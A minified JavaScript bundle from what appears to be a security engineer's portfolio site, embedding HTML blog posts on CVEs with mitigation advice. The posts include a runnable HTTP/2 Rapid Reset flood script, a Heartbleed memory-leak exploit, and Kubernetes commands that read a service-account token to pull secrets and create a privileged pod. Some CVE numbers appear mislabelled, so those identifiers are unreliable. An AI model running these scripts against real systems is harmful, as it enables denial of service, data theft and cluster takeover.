read",category:"CVEs/Libraries"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read",category:"CVEs/Libraries"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read",category:"CVEs/Libraries"}],le={name:"Hem Parekh",role:"Security and Privacy Engineer",current:"Amazon",location:"United States",tz:"PT",email:"hemparekhportfolio@gmail.com"},oa=[{k:"BUILD:",v:"tools that ship, not slides."},{k:"WRITE:",v:"defenders move faster when findings are public."},{k:"HUNT:",v:"every environment tells a story — read it before reacting."},{k:"LEARN:",v:"curiosity-d runs continuously."}],Jf=[{n:String(Mn.length),l:"projects"},{n:String(ke.length),l:"writeups"},{n:String(Xd.length),l:"certs"},{n:"1",l:"patent"}],Qd=["Building MCP-powered privacy review tooling at Amazon","Reverse-engineering CVE-2022-26318 (WatchGuard Firebox) for the next post","Iterating on FORGE — autonomous multi-agent pentesting","Reading: AMD-TSA microcode advisory + transient scheduler attacks"],Lt={FORGE:{code:"FRG",status:"ACTIVE",metric:"226 vulns surfaced",stack:["React","Python","FastAPI","Docker","WebSocket"]},Raven:{code:"RVN",status:"ACTIVE",metric:"multi-agent platform",stack:["Python","LLM","Binary RE"]},"Phish Analyzer Tool":{code:"SITA",status:"PATENTED",metric:"patented design",stack:["Desktop","Sandbox"]},"Secure Communication Using Image Exif Data":{code:"EXIF",status:"RESEARCH",metric:"covert channel paper",stack:["Image","Crypto","Steganography"]},"Architecture and Advancement in Virtualization of TPM":{code:"vTPM",status:"RESEARCH",metric:"research paper",stack:["Virtualization","TPM","Cloud"]},"Quantum Key Distribution":{code:"QKD",status:"RESEARCH",metric:"QKD distance study",stack:["Quantum","Crypto"]},"SecTool: The Comprehensive Cybersecurity Toolkit":{code:"SEC",status:"SHIPPED",metric:"all-in-one toolkit",stack:["Python","Toolkit"]},"Website Crawler":{code:"WCR",status:"SHIPPED",metric:"scraping utility",stack:["Python","Web"]},ShellScribe:{code:"SHL",status:"ACTIVE",metric:"policy-gated runner",stack:["Python","Plugin","CLI"]}},hc=Xd.map(e=>{const n=e.details.match(/by\s+([A-Za-z0-9\s\-&/]+?)(?:\s*-|\s*$)/),t=e.details.match(/(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d{4}/);return{title:e.title,iss:e.issuer||(n?n[1].trim():"—"),y:t?t[0]:"—",href:e.href}});function Zf(){const e=n=>n.toUpperCase().includes("CVE");return ke.filter(n=>e(n.title)).map(n=>{const t=n.title.match(/CVE[-–](\d{4})[-–]?(\d+)/i),s=t?`CVE-${t[1]}-${t[2]}`:n.slug.toUpperCase(),a=t?t[1]:(n.date.match(/\d{4}/)||["—"])[0],r=(n.excerpt.split(/[.,]/)[0]||"Unknown").slice(0,40);return{id:s,target:r,class:n.category||"Unknown",year:a,role:"study",slug:n.slug}})}const xt=Zf(),mc=Xf.map(e=>({label:e.label,href:e.href,handle:e.label==="GitHub"?"@Hem1700":e.label==="LinkedIn"?"/in/hem-parekh":e.label==="Medium"?"@hemparekh1596":e.label==="TryHackMe"?"/p/beatmonk":e.label==="HackTheBox"?"/profile":"—"})),eg={app:"Apps",post:"Writing",project:"Projects",cve:"CVEs"},ng=["app","post","project","cve"];function tg(e,n){if(!n)return 0;const t=n.toLowerCase(),s=(e.title||"").toLowerCase(),a=(e.body||"").toLowerCase();let r=0;s===t?r+=100:s.startsWith(t)?r+=60:s.includes(t)&&(r+=40),a.includes(t)&&(r+=12);for(const o of t.split(/\s+/).filter(Boolean))s.includes(o)&&(r+=4),a.includes(o)&&(r+=1);return r}function Jd({onClose:e,onLaunch:n,onOpenPost:t,onRunCveCommand:s}){const[a,r]=g.useState(""),[o,l]=g.useState(0),c=g.useMemo(()=>{const w=Yd.map(h=>{var x;return{type:"app",title:_e[h].title,subtitle:((x=_e[h].title.split("—")[1])==null?void 0:x.trim())||"",body:_e[h].title,action:()=>n(h),g:_e[h].g}}),y=ke.map(h=>({type:"post",title:h.title,subtitle:`${h.date} · ${h.readTime} · ${h.category}`,body:`${h.excerpt||""} ${h.category||""}`,action:()=>t(h.slug),g:"g-notes"})),T=Mn.map(h=>{const x=Lt[h.title]||{};return{type:"project",title:h.title,subtitle:[x.code,x.status,(h.tags||[]).join(" / ")].filter(Boolean).join(" · "),body:`${h.description||""} ${(h.tags||[]).join(" ")} ${(x.stack||[]).join(" ")} ${x.code||""}`,action:()=>n("files",{selectedTitle:h.title}),g:"g-files"}}),u=ke.filter(h=>h.title.toUpperCase().includes("CVE")).map(h=>{const x=h.title.match(/CVE[-–](\d{4})[-–]?(\d+)/i),k=x?`CVE-${x[1]}-${x[2]}`:h.slug.toUpperCase();return{type:"cve",title:`${k} — ${h.title.replace(/^CVE[-–\d]+/i,"").trim()}`,subtitle:`${h.date} · ${h.category}`,body:`${h.excerpt||""} ${h.category||""} ${k}`,action:()=>s(k),g:"g-term"}});return[...w,...y,...T,...u]},[n,t,s]),d=g.useMemo(()=>{const w=["finder","notes","terminal"].map(T=>c.find(f=>f.type==="app"&&f.title===_e[T].title)).filter(Boolean),y=c.filter(T=>T.type==="post").slice(0,3);return[...w,...y]},[c]),m=g.useMemo(()=>a.trim()?c.map(w=>({item:w,s:tg(w,a)})).filter(w=>w.s>0).sort((w,y)=>y.s-w.s).slice(0,12).map(w=>w.item):d,[a,c,d]),p=g.useMemo(()=>{const w={};return m.forEach(y=>{var T;(w[T=y.type]||(w[T]=[])).push(y)}),ng.filter(y=>{var T;return(T=w[y])==null?void 0:T.length}).map(y=>({type:y,label:eg[y],items:w[y]}))},[m]),v=p.flatMap(w=>w.items),b=w=>{if(w.key==="Escape")e();else if(w.key==="ArrowDown")w.preventDefault(),l(y=>Math.min(v.length-1,y+1));else if(w.key==="ArrowUp")w.preventDefault(),l(y=>Math.max(0,y-1));else if(w.key==="Enter"){const y=v[o];y&&(y.action(),e())}};return i.jsxs("div",{className:"spotlight",onClick:w=>w.stopPropagation(),children:[i.jsx("input",{autoFocus:!0,placeholder:"Search apps, posts, projects, CVEs…",value:a,onChange:w=>{r(w.target.value),l(0)},onKeyDown:b}),!a.trim()&&i.jsxs("div",{className:"sp-hint",children:[i.jsx("span",{children:"↑↓ navigate"}),i.jsx("span",{children:"↵ open"}),i.jsx("span",{children:"esc close"})]}),i.jsxs("div",{className:"spot-rs",children:[p.length===0&&i.jsx("div",{className:"re",children:i.jsxs("div",{className:"ttl",style:{color:"var(--mut)"},children:['no results for "',a,'"']})}),p.map(w=>i.jsxs("div",{children:[i.jsx("div",{className:"sp-group",children:w.label}),w.items.map(y=>{const T=v.indexOf(y);return i.jsxs("div",{className:`re ${T===o?"on":""}`,onClick:()=>{y.action(),e()},onMouseEnter:()=>l(T),children:[i.jsx("div",{className:`ic ${y.g}`}),i.jsxs("div",{style:{flex:1,minWidth:0},children:[i.jsx("div",{className:"ttl",children:y.title}),y.subtitle&&i.jsx("div",{className:"typ",children:y.subtitle})]})]},`${w.type}-${y.title}`)})]},w.type))]})]})}const sg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ag=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,rg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ig=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,og=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
